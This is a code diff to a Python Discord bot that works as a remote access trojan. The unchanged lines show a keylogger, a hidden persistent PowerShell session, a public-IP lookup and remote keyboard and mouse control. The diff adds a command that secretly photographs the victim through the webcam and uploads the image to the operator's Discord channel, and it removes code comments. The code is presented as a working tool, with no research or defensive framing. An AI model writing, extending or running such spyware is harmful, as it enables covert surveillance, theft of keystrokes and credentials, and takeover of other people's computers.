@@ -14,9 +14,10 @@ from dotenv import load_dotenv
 import atexit
 import platform
 import psutil
+import cv2
 
 
-# Conditional imports for additional functionality
+
 KEYBOARD_AVAILABLE = False
 try:
     import keyboard as kb
@@ -55,7 +56,7 @@ if not TOKEN:
     print("Error: DISCORD_TOKEN not found in .env file")
     sys.exit(1)
 
-# Configuration
+
 DOWNLOAD_FOLDER = "C:/DiscordDownloads"
 if not os.path.exists(DOWNLOAD_FOLDER):
     os.makedirs(DOWNLOAD_FOLDER)
@@ -75,7 +76,7 @@ keylog_buffer = []
 keylogger_thread = None
 
 
-# --- Keylogger Functions ---
+
 def keylogger_callback(event):
     """Callback function for keylogger."""
     global keylog_buffer
@@ -185,7 +186,7 @@ Write-Output "{marker}"
 def simulate_keyboard_with_modifiers(text):
     """Simulate keyboard with support for uppercase and special characters."""
     try:
-        # Map of special characters requiring SHIFT
+        
         shift_chars = {
             '!': '1', '@': '2', '#': '3', '$': '4', '%': '5',
             '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
@@ -236,27 +237,25 @@ async def process_single_key(key_input, ctx, send_response=False):
         'windows': 'win', 'win': 'win',
         'capslock': 'capslock', 'caps': 'capslock',
         
-        # Arrows
         'up': 'up', 'down': 'down', 'left': 'left', 'right': 'right',
         
-        # Function keys
         'f1': 'f1', 'f2': 'f2', 'f3': 'f3', 'f4': 'f4',
         'f5': 'f5', 'f6': 'f6', 'f7': 'f7', 'f8': 'f8',
         'f9': 'f9', 'f10': 'f10', 'f11': 'f11', 'f12': 'f12',
     }
     
-    # Mouse buttons handling
+    
     mouse_buttons = {
         'left': 'left', 'leftclick': 'left', 'mouse1': 'left',
         'right': 'right', 'rightclick': 'right', 'mouse2': 'right',
         'middle': 'middle', 'center': 'middle', 'mouse3': 'middle'
     }
     
-    # Check if it's a mouse button
+   
     if key_input in mouse_buttons:
         mouse_action = mouse_buttons[key_input]
         
-        # For mouse buttons
+        
         try:
             if PYDIRECTINPUT_AVAILABLE:
                 pydirectinput.click(button=mouse_action)
@@ -277,12 +276,12 @@ async def process_single_key(key_input, ctx, send_response=False):
                 await ctx.send(f"Mouse click error: {str(e)}")
             return f"error: {str(e)}"
     
-    # Handle key combinations (e.g., ctrl+c, alt+f4, shift+a)
+    
     if '+' in key_input:
         keys = [k.strip() for k in key_input.split('+')]
         
         try:
-            # Press all keys together
+            
             for key in keys:
                 mapped_key = key_map.get(key.lower(), key.lower())
                 if PYDIRECTINPUT_AVAILABLE:
@@ -292,7 +291,6 @@ async def process_single_key(key_input, ctx, send_response=False):
             
             time.sleep(0.05)
             
-            # Release all keys (in reverse order)
             for key in reversed(keys):
                 mapped_key = key_map.get(key.lower(), key.lower())
                 if PYDIRECTINPUT_AVAILABLE:
@@ -309,7 +307,6 @@ async def process_single_key(key_input, ctx, send_response=False):
                 await ctx.send(f"Error with combination {key_input}: {str(e)}")
             return f"error: {str(e)}"
     
-    # Handle single keys (including uppercase letters)
     if len(key_input) == 1 and key_input.isalpha() and key_input.isupper():
         # Single uppercase letter
         try:
@@ -331,11 +328,9 @@ async def process_single_key(key_input, ctx, send_response=False):
                 await ctx.send(f"Error pressing uppercase {key_input}: {str(e)}")
             return f"error: {str(e)}"
     
-    # Standard single key
     mapped_key = key_map.get(key_input, key_input)
     
     try:
-        # Press the key
         if PYDIRECTINPUT_AVAILABLE:
             pydirectinput.press(mapped_key)
         else:
@@ -357,7 +352,6 @@ async def on_ready():
     global target_channel, ps_process
     print(f"Bot logged in as {bot.user} (ID: {bot.user.id})")
 
-    # Start persistent PowerShell process (hidden)
     try:
         ps_process = subprocess.Popen(
             ['powershell', '-NoLogo', '-NoExit', '-Command', '-'],
@@ -373,7 +367,6 @@ async def on_ready():
         print(f"Failed to start PowerShell: {e}")
         ps_process = None
 
-    # Get public IP
     ip = "unknown"
     try:
         ip = requests.get('https://api.ipify.org', timeout=8).text.replace('.', '-')
@@ -419,6 +412,41 @@ async def on_ready():
         "- !keylog <action>  Keylogger controls"
     )
     await target_channel.send(f"```\nService online and ready\n\n{startup}\n```")
+
+@bot.command(name='webcam')
+async def webcam_snap(ctx):
+    """
+    Takes ONE photo from the default webcam and sends it to Discord.
+    """
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        await ctx.send("Camera not available or already in use.")
+        return
+    try:
+        await asyncio.sleep(0.5)
+        ret, frame = cap.read()
+        if not ret:
+            await ctx.send("Failed to capture image from webcam.")
+            return
+        
+        success, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 75])
+        if not success:
+            await ctx.send("Failed to encode image.")
+            return
+        bio = BytesIO(buffer.tobytes())
+        filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+        file = discord.File(bio, filename=filename)
+        
+        # Send the photo
+        await ctx.send("Webcam photo:", file=file)
+        
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+    
+    finally:
+        cap.release()
+
+
 
 
 @bot.command(name='commands')
